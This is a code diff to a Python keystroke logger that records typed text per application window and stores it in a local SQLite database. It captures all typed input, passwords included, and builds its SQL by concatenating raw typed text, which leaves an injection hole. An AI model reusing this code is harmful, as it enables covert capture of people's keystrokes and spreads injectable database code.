@@ -7,10 +7,11 @@ prev_process_keylogger = ''
 prev_key = ''
 exclude_log = ['Explorer', 'Searchui', 'Task Switching', '', ' ']  # these are excluded apps
 words = ''
+words_new = ''
 
 
 def start(program_name, process, window, ctrl_pressed, key=None, x=None):
-    global prev_window_keylogger, prev_app_keylogger, prev_process_keylogger, prev_key, exclude_log, words
+    global prev_window_keylogger, prev_app_keylogger, prev_process_keylogger, prev_key, exclude_log, words, words_new
 
     if program_name not in exclude_log:
         if len(key) == 1:
@@ -37,11 +38,13 @@ def start(program_name, process, window, ctrl_pressed, key=None, x=None):
     else:
         pass
 
+    words_new = words
+
     return
 
 
 def push_data(db_path):
-    global words
+    global words, prev_window_keylogger, prev_app_keylogger
     words_c = words
 
     if len(words_c) > 0:
@@ -93,3 +96,31 @@ def count_words(sentence):
     s = [word for word in s if word != '<DELETE>' and word != '' and word != '<SHORTCUT>']
     w_count = len(s)
     return w_count
+
+
+def push_data_new(db_path):
+    global words, prev_window_keylogger, prev_app_keylogger, words_new
+    words_c = words_new
+
+    if len(words_c) > 0:
+        d = datetime.datetime.now()
+        date_d = str(d).split(" ")[0]
+        time_t = (str(d).split(" ")[1]).split('.')[0]
+
+        connection = sqlite3.connect(db_path)
+        my_cursor = connection.cursor()
+
+        try:
+            if len(words_c) > 0:
+                len_words = str(count_words(words_c))
+                query2 = "INSERT INTO key_logger_new(window, p_name, d, t, content, characters) VALUES('" + prev_window_keylogger + "','" + prev_app_keylogger + "','" + date_d + "','" + time_t + "','" + words_c + "','" + len_words + "')"
+            else:
+                pass
+        except Exception as e:
+            print(e)
+        print("LOGGED NEW - " + words_c)
+        my_cursor.execute(query2)
+        connection.commit()
+        words_new = ""
+
+    return
